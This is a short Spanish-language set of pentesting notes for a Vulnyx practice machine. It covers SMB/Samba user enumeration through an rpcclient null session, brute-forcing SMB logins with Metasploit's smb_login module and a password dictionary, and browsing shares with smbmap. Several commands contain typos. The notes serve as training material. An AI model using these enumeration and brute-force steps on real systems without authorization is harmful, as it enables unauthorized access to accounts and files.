- Tags: #enumeration #enumeration_smb #enumeration_smb_users #tool_rpcclient #window #smb_linux #samba_linux #tools #recursos #recursos_vulnyx #metasploit #fuerza_bruta_metasploit #smbclient #smbmap 

Es importante entender que *smb* y *samba* son 2 cosas distintas, samba también corre por el puerto 445 y sirve para que aquellos sistemas que no utilizan windows se comuniquen con aquellos que si utilizan smb. Básicamente para conectar linux con windows

**Recurso** : Maquina Discovery *Vulnyx.com*

```bash
rpccliet -U "" -N ip_victima

#Comando importantes de rpcclient, srvinfo, querydispinfo, enumdomusers

>srvinfo  #nos da info del servidor 
>querydispinfo  #nos da info de usuarios en el servidor
>enumdomusers   #Nos da info de usuarios en el servidor
```

Con estos datos de usuarios podemos hacer ataques de fuerza bruta al protocolo samba  tanto con metasploit como con hydra

```bash
mfsconsole
>use scanner/smb/smb_login
>show options
>set RHOST ip_victima
>set RPORT 445
>set SMBUser uer
>set PASS_FILE /dictionary_pass.txt
>set VERBOSE false  #opcional
>run
```

Teniendo user y pass ya podemos enumerar con herramientas como smbclient y smbmap

Entrar dentro de un recurso con smbmap
```bash
smbmap -H ip_victima -u 'user' -p 'pass' -r 'nombre_recurso'
```